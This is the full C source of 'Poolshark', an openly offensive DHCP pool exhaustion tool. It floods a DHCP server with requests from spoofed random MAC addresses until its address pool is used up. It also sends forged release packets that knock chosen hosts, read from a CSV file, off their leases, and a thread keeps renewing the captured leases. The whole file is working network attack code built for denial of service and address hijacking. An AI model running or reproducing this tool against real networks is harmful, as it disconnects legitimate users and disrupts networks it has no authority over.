#ifdef __INTELLISENSE__
#pragma diag_suppress 70
#endif

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <ifaddrs.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <getopt.h>
#include <signal.h>
#include <sys/select.h>
#include <sys/time.h>
#include <time.h>
#include <pthread.h>

#define BUFFER_SIZE 65535
#define MAX_LINE_LEN 2048
#define TIMEOUT 10

// DHCP header structure
typedef struct DHCP
{
    uint8_t opcode;
    uint8_t hw_type;
    uint8_t hw_len;
    uint8_t hops;
    uint8_t transaction_id[4];
    uint8_t sec_elapsed[2];
    uint8_t flags[2];
    uint8_t client_ip[4];
    uint8_t ip_addr[4];
    uint8_t server_ip[4];
    uint8_t gtwy_ip[4];
    uint8_t client_mac[16];
    uint8_t server_name[64];
    uint8_t boot_file[128];
    uint8_t magic_cookie[4];
    uint8_t options[312];

} __attribute__((packed)) DHCP;

// IP header structure
typedef struct IP
{
    uint8_t version_ihl;
    uint8_t tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t flags_offset;
    uint8_t ttl;
    uint8_t proto;
    uint16_t checksum;
    uint8_t src_ip[4];
    uint8_t dst_ip[4];

} __attribute__((packed)) IP;

typedef struct UDP
{
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t len;
    uint16_t checksum;
} __attribute__((packed)) UDP;

typedef struct EthHeader
{
    uint8_t dst_mac[6];
    uint8_t src_mac[6];
    uint16_t eth_type;
} __attribute__((packed)) EthHeader;

typedef struct Packet
{
    EthHeader eth;
    IP ip;
    UDP udp;
    DHCP dhcp;
} __attribute__((packed)) Packet;

typedef struct Exausted
{
    uint8_t ip[4];
    uint8_t mac[16];
    uint32_t lease_time;
    time_t timestamp_inserted;
    uint8_t dhcp_host[4];
    uint8_t dhcp_mac[6];
    struct Exausted *next;
} Exausted;

typedef struct Targets
{
    uint8_t ip_addr[4];
    uint8_t mac[6];
    struct Targets *next;
} Targets;

volatile sig_atomic_t keep_running = 1;
// for testing
int num_of_loops = 0;
struct sockaddr_ll addr = {0};
socklen_t addr_len;
uint8_t dhcp_host[4];
int sock;
Exausted *head = NULL;
int ifindex = 0;

void print_usage(const char *progname);
void spoof_mac(uint8_t *mac);
void rand_transaction_id(uint8_t *id);
void calc_ip_checksum(Packet *p);
int netmask_to_cidr(unsigned long netmask);
void exaust_pool(int ifindex, Packet *p, Exausted **head, int num, int delay, const char *hostname);
void stop(int sig);
void cleanup(Packet *p, Exausted *head);
void release_target(FILE *fp, Packet *p, uint8_t iface_ip, int ifindex);
void release_on_exit(Packet *p, Exausted *head, int ifindex);
int wait_for_response(unsigned char *buffer, uint8_t *transaction_id, int timout);
Packet *init_packet(void);
void *renew_leases(void *arg);

int main(int argc, char *argv[])
{
    signal(SIGINT, stop);
    char *iface = NULL;
    char *import_file = NULL;
    int opt;
    int delay = 0;
    FILE *fp = NULL;
    const char *hostname = "pwn3d-poolshark";
    int mode = 0;

    if (getuid() != 0)
    {
        printf("Error: Poolshark requires root priveledges\n");
        printf("Try: sudo %s -i <interface>\n", argv[0]);
        return 1;
    }

    while ((opt = getopt(argc, argv, "i:d:f:n:l:h")) != -1)
    {
        switch (opt)
        {
        case 'i':
            iface = optarg;
            break;
        case 'h':
            print_usage(argv[0]);
            exit(EXIT_SUCCESS);
        case 'd':
            delay = atoi(optarg);
            break;
        case 'f':
            import_file = optarg;
            break;
        case 'n':
            hostname = (const char*)optarg;
            break;
        case 'l':
            num_of_loops = atoi(optarg);
            break;
        }
    }

    if (!iface)
    {
        printf("Error: Interface is required\n");
        exit(EXIT_FAILURE);
    }

    if (import_file)
    {
        fp = fopen(import_file, "r");
        if (!fp)
        {
            perror("fopen");
            return 1;
        }
        mode = 1;
    }

    Packet *p = init_packet();

    struct ifreq ifr;
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (!p)
    {
        perror("malloc");
        return 1;
    }

    if (sock < 0)
    {
        perror("socket");
        return 1;
    }

    srand(time(NULL));

    struct sockaddr_in *iaddr = (struct sockaddr_in *)&ifr.ifr_netmask;
    memcpy(ifr.ifr_name, iface, sizeof(iface));

    ifindex = if_nametoindex(ifr.ifr_name);

    if (ifindex < 0)
    {
        perror("if_nametoindex");
        return 1;
    }

    if (ioctl(sock, SIOCGIFNETMASK, &ifr) < 0)
    {
        perror("ioctl");
        return 1;
    }

    int cidr = netmask_to_cidr(iaddr->sin_addr.s_addr);
    int num_of_ips = (1 << (32 - cidr)) - 2;

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl");
        return 1;
    }

    addr_len = sizeof(addr);
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifindex;
    addr.sll_halen = 6;
    memset(addr.sll_addr, 0xff, 6);

    iaddr = (struct sockaddr_in *)&ifr.ifr_addr;
    uint8_t iface_ip[4];
    memcpy(iface_ip, &iaddr->sin_addr.s_addr, 4);

    if (mode)
    {
        printf("Attack Mode: Targeted\n");
        release_target(fp, p, *iface_ip, ifindex);
    }
    else
    {
        printf("Attack Mode: Normal\n");
    }

    if (!num_of_loops)
    {
        num_of_loops = num_of_ips;
    }
    
    pthread_t thread;
    int thread_id = 1;

    if(keep_running)
    {

        if(pthread_create(&thread, NULL, renew_leases, &thread_id) != 0)
        {
            perror("pthread_create");
            return 1;
        }
        exaust_pool(ifindex, p, &head, num_of_ips, 0, hostname);
    }
    pthread_join(thread, NULL);
    release_on_exit(p, head, ifindex);
    cleanup(p, head);
}

void spoof_mac(uint8_t *mac)
{
    for (int i = 0; i < 6; i++)
    {
        mac[i] = rand() % 256;
    }
    // clear the unicast bit and set the locally administered bit
    mac[0] = (mac[0] & 0xfe) | 0x02;
}

void rand_transaction_id(uint8_t *id)
{
    for (int i = 0; i < 4; i++)
    {
        id[i] = rand() % 256;
    }
}

void calc_ip_checksum(Packet *p)
{
    p->ip.checksum = 0;

    uint32_t sum = 0;
    uint16_t word;
    int ip_header_len = sizeof(p->ip);

    for (int i = 0; i < ip_header_len / 2; i++)
    {
        memcpy(&word, (uint8_t *)&p->ip + (i * 2), sizeof(uint16_t));
        sum += ntohs(word);
    }

    while (sum >> 16)
    {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    p->ip.checksum = htons(~sum & 0xffff);
}

int netmask_to_cidr(unsigned long netmask)
{
    int cidr = 0;

    while (netmask)
    {
        cidr += netmask & 1;
        netmask >>= 1;
    }

    return cidr;
}

void exaust_pool(int ifindex, Packet *p, Exausted **head, int num, int delay, const char *hostname)
{
    unsigned char buffer[BUFFER_SIZE];
    char random_mac[18];
    char host[16];
    char offered_ip[16];
    int len = strlen(hostname);
    int offset = 0;
    int count = 0;
    int retries = 1;

    struct sockaddr_ll send_addr = {0};
    send_addr.sll_family = AF_PACKET;
    send_addr.sll_ifindex = ifindex;
    send_addr.sll_halen = 6;
    memset(send_addr.sll_addr, 0xff, 6);

    printf("Exausting IP(s)...\n");

    while (keep_running)
    {
        spoof_mac(p->eth.src_mac);
        memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac));
        rand_transaction_id(p->dhcp.transaction_id);
        memset(p->dhcp.options, 0, sizeof(p->dhcp.options));

        p->dhcp.options[0] = 53;
        p->dhcp.options[1] = 1;
        p->dhcp.options[2] = 1;
        p->dhcp.options[3] = 255;

        snprintf(random_mac, sizeof(random_mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 p->eth.src_mac[0],
                 p->eth.src_mac[1],
                 p->eth.src_mac[2],
                 p->eth.src_mac[3],
                 p->eth.src_mac[4],
                 p->eth.src_mac[5]);

        int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&send_addr, sizeof(send_addr));

        if (bytes_sent < 0)
        {
            perror("sendto");
            return;
        }

        if(wait_for_response(buffer, p->dhcp.transaction_id, TIMEOUT) != 1)
        {
            if(retries > 5)
            {
                printf("No offer from host in 5 retries, host is likely fully exausted\n");
            }
            else
            {
                retries++;
                printf("No offer from host in %d(secs), retrying\n", TIMEOUT);
            }
            continue;
        }

        retries = 1;

        Packet *offer = (Packet *)buffer;

        snprintf(host, sizeof(host), "%d.%d.%d.%d",
                    offer->ip.src_ip[0], offer->ip.src_ip[1],
                    offer->ip.src_ip[2], offer->ip.src_ip[3]
                );

        snprintf(offered_ip, sizeof(offered_ip), "%d.%d.%d.%d",
                    offer->dhcp.ip_addr[0], offer->dhcp.ip_addr[1],
                    offer->dhcp.ip_addr[2], offer->dhcp.ip_addr[3]
                );

        offset = 0;

        p->dhcp.options[offset++] = 53;
        p->dhcp.options[offset++] = 1;
        p->dhcp.options[offset++] = 3;

        p->dhcp.options[offset++] = 50;
        p->dhcp.options[offset++] = 4;
        memcpy(&p->dhcp.options[offset], &offer->dhcp.ip_addr[0], 4);
        offset += 4;

        p->dhcp.options[offset++] = 54;
        p->dhcp.options[offset++] = 4;
        memcpy(&p->dhcp.options[offset], &offer->ip.src_ip[0], 4);
        offset += 4;

        p->dhcp.options[offset++] = 12;
        p->dhcp.options[offset++] = len;
        memcpy(&p->dhcp.options[offset], hostname, len);
        offset += len;

        p->dhcp.options[offset++] = 255;

        memset(&p->dhcp.options[offset], 0, 312 - offset);

        calc_ip_checksum(p);

        bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&send_addr, sizeof(send_addr));
        if (bytes_sent < 0)
        {
            perror("sendto");
            return;
        }

        if(wait_for_response(buffer, p->dhcp.transaction_id, TIMEOUT) != 1)
        {
            printf("No ACK from host in %d(secs), retrying...\n", TIMEOUT);
            continue;
        }

        Exausted *new_node = malloc(sizeof(Exausted));
        if (!new_node)
        {
            perror("malloc");
            return;
        }
        count++;
        printf("#%d: Exausted IP [%s]\n", count, offered_ip);

        memcpy(&new_node->ip, &offer->dhcp.ip_addr, sizeof(offer->dhcp.ip_addr));
        memcpy(&new_node->mac, &p->eth.src_mac, sizeof(p->eth.src_mac));
        memcpy(&new_node->dhcp_host, &offer->ip.src_ip, sizeof(offer->ip.src_ip));
        memcpy(&new_node->dhcp_mac, &offer->eth.src_mac, sizeof(offer->eth.src_mac));
        new_node->timestamp_inserted = time(NULL);
        new_node->lease_time = 3600;
        new_node->next = *head;
        *head = new_node;
    }
}

       

void print_usage(const char *progname)
{
    printf("Poolshark - DHCP Pool Exaustion Tool\n\n");
    printf("Usage: sudo %s -i <interface> [-d][-f][-n][-h]\n", progname);
    printf("\n");
    printf("Required:\n");
    printf(" -i <interface>  Network interface to use (e.g., eth0, wlan0)\n");
    printf("\n");
    printf("Options:\n");
    printf(" -d <delay>      Delay between requests in milliseconds (default: 0)\n");
    printf(" -f <file>       Import Cardshark CSV to steal specific IPs first\n");
    printf(" -n <hostname>   Custom hostname for DHCP requests (default: pwn3d-poolshark)\n");
    printf(" -h              Display this help message\n");
    printf("\n");
    printf("Examples:\n");
    printf(" sudo %s -i eth0\n", progname);
    printf(" sudo %s -i wlan0 -d 1000\n", progname);
    printf(" sudo %s -i eth0 -f cardshark_scan.csv\n", progname);
    printf(" sudo %s -i eth0 -n h4ck3ed -d 500\n", progname);
    printf("\n");
    printf("Attack Modes:\n");
    printf(" Normal:   Exhausts entire DHCP pool with random MAC addresses\n");
    printf(" Targeted: Uses -f to steal specific IPs first, then exhausts remainder\n");
    printf("\n");
    printf("Press Ctrl+C to stop exaust attack.\n");
}

void cleanup(Packet *p, Exausted *head)
{
    printf("Cleaning up... ");
    free(p);
    close(sock);
    printf(" [OK]\n");
}

void stop(int sig)
{
    keep_running = 0;
}

void release_target(FILE *fp, Packet *p, uint8_t iface_ip, int ifindex)
{
    char buffer[MAX_LINE_LEN];
    char *token;
    Targets *head = NULL;
    int row_count = 0;
    unsigned char data[BUFFER_SIZE];

    struct sockaddr_ll send_addr = {0};
    send_addr.sll_family = AF_PACKET;
    send_addr.sll_ifindex = ifindex;
    send_addr.sll_halen = 6;
    memset(send_addr.sll_addr, 0xff, 6);

    while (fgets(buffer, MAX_LINE_LEN, fp) != NULL)
    {
        Targets *new_node = malloc(sizeof(Targets));
        if (!new_node)
        {
            perror("malloc");
            return;
        }

        new_node->next = head;

        token = strtok(buffer, ",");
        int col = 0;

        while (token != NULL)
        {
            switch (col)
            {
            case 0:
                inet_pton(AF_INET, token, new_node->ip_addr);
                break;
            case 1:
                int a, b, c, d, e, f;
                if (sscanf(token, "%x:%x:%x:%x:%x:%x", &a, &b, &c, &d, &e, &f) == 6)
                {
                    new_node->mac[0] = (uint8_t)a;
                    new_node->mac[1] = (uint8_t)b;
                    new_node->mac[2] = (uint8_t)c;
                    new_node->mac[3] = (uint8_t)d;
                    new_node->mac[4] = (uint8_t)e;
                    new_node->mac[5] = (uint8_t)f;
                }
                else
                {
                    printf("Error parsing Cardshark import\n");
                    free(new_node);
                    return;
                }
                break;
            }
            col++;
            token = strtok(NULL, ",");
        }
        head = new_node;
        row_count++;
    }
    fclose(fp);

    printf("Releasing %d IP(s)...\n", row_count);

    while(keep_running)
    {
        // clear dhcp options
        memset(p->dhcp.options, 0, sizeof(p->dhcp.options));

        memset(p->ip.src_ip, 0, 4);
        spoof_mac(p->eth.src_mac);
        memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac)); 

        rand_transaction_id(p->dhcp.transaction_id);
        int offset = 0;

        // set for DHCPDISCOVER
        p->dhcp.options[offset++] = 53;
        p->dhcp.options[offset++] = 1;
        p->dhcp.options[offset++] = 1;
        p->dhcp.options[offset++] = 255;

        calc_ip_checksum(p);

        int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&send_addr, sizeof(send_addr));

        if (bytes_sent < 0)
        {
            perror("sendto");
            return;
        }

        if(wait_for_response(data, p->dhcp.transaction_id, TIMEOUT) != 1)
        {
            printf("No offer from host in %d(secs), retrying\n", TIMEOUT);
            continue;
        }

        Packet *offer = (struct Packet*)data;

        char dhcp_str[INET_ADDRSTRLEN];

        int len = sizeof(offer->dhcp.options);
        int i = 0;

        while (i < len)
        {
            if (offer->dhcp.options[i] == 255)
            {
                break;
            }

            if (offer->dhcp.options[i] == 54)
            {
                memcpy(dhcp_host, &offer->dhcp.options[i + 2], 4);
                inet_ntop(AF_INET, dhcp_host, dhcp_str, INET_ADDRSTRLEN);
                break;
            }

            i += 2 + offer->dhcp.options[i + 1];
        }

        Targets *current = head;

        while (current != NULL && keep_running)
        {
            char ip_str[INET_ADDRSTRLEN];
            p->dhcp.opcode = 1;
            memcpy(&p->dhcp.client_mac, &current->mac, sizeof(current->mac));
            memcpy(&p->dhcp.client_ip, &current->ip_addr, sizeof(current->ip_addr));

            memcpy(p->ip.dst_ip, dhcp_host, 4);
            memcpy(p->ip.src_ip, current->ip_addr, 4);
            // clear dhcp options.
            memset(p->dhcp.options, 0, sizeof(p->dhcp.options));

            offset = 0;

            // dhcp release [53][1][7]
            p->dhcp.options[offset++] = 53;
            p->dhcp.options[offset++] = 1;
            p->dhcp.options[offset++] = 7;

            // dhcp server identifier [54][4][ipaddr_bytes]
            p->dhcp.options[offset++] = 54;
            p->dhcp.options[offset++] = 4;
            memcpy(&p->dhcp.options[offset], &dhcp_host, 4);
            offset += 4;

            // end of dhcp options.
            p->dhcp.options[offset++] = 255;

            calc_ip_checksum(p);

            int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&send_addr, sizeof(send_addr));

            if (bytes_sent < 0)
            {
                perror("sendto");
                return;
            }
            inet_ntop(AF_INET, current->ip_addr, ip_str, INET_ADDRSTRLEN);
            current = current->next;
            printf("Released [%s]\n", ip_str);
        }
        break;
    }
    if(keep_running)
    {
        printf("Release complete, now running exaustion...\n");
    }
}

void release_on_exit(Packet *p, Exausted *head, int ifindex)
{
    printf("\n\nReleasing all exausted IP(s)...");
    Exausted *current = head;
    struct sockaddr_ll send_addr = {0};
    send_addr.sll_family = AF_PACKET;
    send_addr.sll_ifindex = ifindex;
    send_addr.sll_halen = 6;

    int offset = 0;

    while (current != NULL)
    {
        Exausted *tmp = current;
        p->dhcp.opcode = 1;
        memcpy(&p->dhcp.client_mac, &current->mac, sizeof(current->mac));
        memcpy(&p->dhcp.client_ip, &current->ip, sizeof(current->ip));

        memcpy(&p->ip.dst_ip, &current->dhcp_host, sizeof(current->dhcp_host));
        memcpy(&p->ip.src_ip, &current->ip, 4);
        // clear dhcp options.
        memset(p->dhcp.options, 0, sizeof(p->dhcp.options));
        memcpy(&send_addr.sll_addr, &current->dhcp_mac, sizeof(current->dhcp_mac));

        offset = 0;

        // dhcp release [53][1][7]
        p->dhcp.options[offset++] = 53;
        p->dhcp.options[offset++] = 1;
        p->dhcp.options[offset++] = 7;

        // dhcp server identifier [54][4][ipaddr_bytes]
        p->dhcp.options[offset++] = 54;
        p->dhcp.options[offset++] = 4;
        memcpy(&p->dhcp.options[offset], &current->dhcp_host, 4);
        offset += 4;

        // end of dhcp options.
        p->dhcp.options[offset++] = 255;

        calc_ip_checksum(p);

        int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&send_addr, sizeof(send_addr));

        if (bytes_sent < 0)
        {
            perror("sendto");
            return;
        }
        current = current->next;
        free(tmp);
    }
    printf(" [OK]\n");
}

int wait_for_response(unsigned char *buffer, uint8_t *transaction_id, int timeout)
{
    time_t start_time = time(NULL);

    while(keep_running)
    {
        time_t elapsed_time = time(NULL) - start_time;
        if(elapsed_time >= timeout)
        {
            return 0;
        }

        fd_set readfds;
        struct timeval tv;
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);
        tv.tv_sec = timeout - elapsed_time;
        tv.tv_usec = 0;

        int result = select(sock+1, &readfds, NULL, NULL, &tv);

        if(result == 0)
        {
            return 0;
        }
        if(result < 0)
        {
            return -1;
        }

        int received_bytes = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&addr, &addr_len);
        if(received_bytes < 0)
        {
            return -1;
        }

        Packet *new_packet = (Packet *)buffer;

        if(new_packet->dhcp.opcode == 0x02 && memcmp(new_packet->dhcp.transaction_id, transaction_id, 4) == 0)
        {
            return 1;
        }
    }
}

Packet *init_packet(void)
{
    Packet *p = malloc(sizeof(Packet));
    if(!p)
    {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    // init Ethernet header
    spoof_mac(p->eth.src_mac);
    memset(p->eth.dst_mac, 0xff, sizeof(p->eth.dst_mac));
    p->eth.eth_type = htons(0x0800);

    // init IP header
    // version 4 header length 5
    p->ip.version_ihl = 0x45;
    p->ip.tos = 0;
    // IP + UDP + DHCP headers
    p->ip.total_len = htons(20 + 8 + 552);
    p->ip.id = htons(0);
    // don't fragment, no offset
    p->ip.flags_offset = htons(0x4000);
    p->ip.ttl = 64;
    // protocol will be UDP
    p->ip.proto = 17;
    // will be calculated once the entire packet is built
    p->ip.checksum = 0;
    memset(p->ip.src_ip, 0x00, sizeof(p->ip.src_ip));
    memset(p->ip.dst_ip, 0xff, sizeof(p->ip.dst_ip));

    // init udp header
    p->udp.src_port = htons(68);
    p->udp.dst_port = htons(67);
    p->udp.len = htons(8 + 552);
    p->udp.checksum = 0;

    // init dhcp header
    p->dhcp.opcode = 1;
    p->dhcp.hw_type = 1;
    p->dhcp.hw_len = 6;
    p->dhcp.hops = 0;
    rand_transaction_id(p->dhcp.transaction_id);
    memset(p->dhcp.sec_elapsed, 0x00, sizeof(p->dhcp.sec_elapsed));
    memset(p->dhcp.flags, 0x00, sizeof(p->dhcp.flags));
    memset(p->dhcp.client_ip, 0x00, sizeof(p->dhcp.client_ip));
    memset(p->dhcp.server_ip, 0x00, sizeof(p->dhcp.server_ip));
    memset(p->dhcp.gtwy_ip, 0x00, sizeof(p->dhcp.gtwy_ip));
    memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac));
    memset(p->dhcp.server_name, 0x00, sizeof(p->dhcp.server_name));
    memset(p->dhcp.boot_file, 0x00, sizeof(p->dhcp.boot_file));
    memset(p->dhcp.ip_addr, 0x00, sizeof(p->dhcp.ip_addr));
    p->dhcp.magic_cookie[0] = 99;
    p->dhcp.magic_cookie[1] = 130;
    p->dhcp.magic_cookie[2] = 83;
    p->dhcp.magic_cookie[3] = 99;
    p->dhcp.options[0] = 53;
    p->dhcp.options[1] = 1;
    p->dhcp.options[2] = 1;
    p->dhcp.options[3] = 255;
    memset(&p->dhcp.options[4], 0x00, 308);
    calc_ip_checksum(p);

    return p;
}

void *renew_leases(void *arg)
{
    Packet *p = init_packet();
    char ip_str[INET_ADDRSTRLEN];
    unsigned char buffer[BUFFER_SIZE];
    
    while(keep_running)
    {
        Exausted *current = head;
        rand_transaction_id(p->dhcp.transaction_id);

        while(current != NULL && keep_running)
        {
            memcpy(&p->dhcp.client_mac, &current->mac, sizeof(current->mac));
            memcpy(&p->dhcp.client_ip, &current->ip, sizeof(current->ip));

            memcpy(p->ip.dst_ip, current->dhcp_host, 4);
            memcpy(p->ip.src_ip, current->ip, 4);
            memcpy(p->eth.dst_mac, current->dhcp_mac, sizeof(current->dhcp_mac));
            // clear dhcp options.
            memset(p->dhcp.options, 0, sizeof(p->dhcp.options));
            inet_ntop(AF_INET, current->ip, ip_str, INET_ADDRSTRLEN);

            int offset = 0;
            // clear DHCP options

            time_t time_now = time(NULL);
            int half_lease = (current->lease_time / 2);
            int elapsed = (int)difftime(time_now, current->timestamp_inserted);

            printf("[THREAD_RENEWAL] %s elapsed time %d, total lease time: %d\n", ip_str, elapsed, current->lease_time);
            sleep(3);

            if(elapsed < half_lease)
            {
                current = current->next;
                continue;
            }

            printf("Lease for %s expires soon, renewing lease...\n", ip_str);

            p->dhcp.opcode = 1;

            p->dhcp.options[offset++] = 53;
            p->dhcp.options[offset++] = 1;
            p->dhcp.options[offset++] = 3;

            p->dhcp.options[offset++] = 50;
            p->dhcp.options[offset++] = 4;
            memcpy(&p->dhcp.options[offset], &current->ip, sizeof(current->ip));
            offset += 4;

            p->dhcp.options[offset++] = 54;
            p->dhcp.options[offset++] = 4;
            memcpy(&p->dhcp.options[offset], &current->dhcp_host, 4);
            offset += 4;

            p->dhcp.options[offset++] = 255;

            calc_ip_checksum(p);

            struct sockaddr_ll send_addr = {0};
            send_addr.sll_family = AF_PACKET;
            send_addr.sll_ifindex = ifindex;
            send_addr.sll_halen = 6;
            memcpy(send_addr.sll_addr, current->dhcp_mac, sizeof(current->dhcp_mac));

            int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&send_addr, sizeof(send_addr));

            if(bytes_sent < 0)
            {
                perror("sendto");
                exit(EXIT_FAILURE);
            }

            if(wait_for_response(buffer, p->dhcp.transaction_id, TIMEOUT) != 1)
            {
                printf("No reponse from host while trying to renew %s, will try again on next iteration...\n", ip_str);
                current = current->next;
                continue;
            }

            printf("Renewed %s succesfully", ip_str);
            current = current->next;
        }
    }
    free(p);
}